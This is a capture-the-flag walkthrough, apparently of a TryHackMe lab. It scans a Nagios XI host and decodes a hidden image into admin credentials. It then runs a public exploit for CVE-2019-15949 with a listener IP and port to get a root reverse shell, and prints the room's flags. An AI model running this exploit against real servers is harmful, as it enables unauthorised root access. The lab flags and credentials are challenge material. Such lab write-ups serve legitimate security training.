Port scanning

Nax

Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an user authenticated execute remote code execution.


```bash
nmap -p- --min-rate=5000 10.10.253.112    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 19:12 EEST
Nmap scan report for 10.10.253.112
Host is up (0.24s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknown

nmap -p 22,25,80,389,443,5667 -sC -sV 10.10.253.112
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 19:14 EEST
Nmap scan report for 10.10.253.112
Host is up (0.35s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
|   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
|_  256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-03-23T23:42:04
|_Not valid after:  2030-03-21T23:42:04
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-03-24T00:14:58
|_Not valid after:  2030-03-22T00:14:58
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
5667/tcp open  tcpwrapped
Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.89 seconds
```

Ok so we have ssh, mailing service, http AND https. interesting. And tcpwrapper and ldap

There is a login in the http http://10.10.253.112/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1

The website had periodic table elements and i "decoded" them into "47 80 73 51 84 46 80 78 103"
And that turns into /PI3T.PNg after cybercheffing it

After cryptographing the iamge i got the name "Piet Mondrian" from it. 

```bash
./npiet PI3T.ppm     
nagiosadmin%n3p3UQ&9BjLp4$7uhWdY
```

Now we were able login into the nagiosxi. It instantly prompts us that its outdated which is a good sign since there must be vulnerabilities for this current one out there.

The info on the room said that it required metasploit so i decided to go on there and look for the cve's for Nagios XI 5.5.6 

The exploit we'll try is https://www.cve.org/CVERecord?id=CVE-2019-15949

https://github.com/hadrian3689/nagiosxi_5.6.6

```bash
python3 exploit.py -t 'https://10.10.253.112' -b /nagiosxi/ -u nagiosadmin -p 'n3p3UQ&9BjLp4$7uhWdY' -lh 10.6.25.159 -lp 4444 
CVE-2019-15949 Nagiosxi authenticated Remote Code Execution
Trying to log in
Login NSP Token: 4bd99805d9db8952f97964a5b68a10628d31a427b3b1074ff6c435ea8efb805e
Logged in!
Uploading Malicious Check Ping Plugin
Upload NSP Token: 55261afbdb047f92b3f5764d52843048ce8e81adf0b2460f6879d2bf6b475592
```

We were able to use the exploit to get a reverse shell.

the CVE basically allows command execution as root. 

```bash
root@ubuntu:/home/galand# cat user.txt
cat user.txt
THM{84b17add1d72a9f2e99c33bc568ae0f1}
root@ubuntu:/home/galand# cat /root/root.txt
cat /root/root.txt
THM{c89b2e39c83067503a6508b21ed6e962}
```

Interesting machine since it instantly gave us root. Maybe it was because that cryptography part of the ctf was so trash that they wanted to make the ending more easy
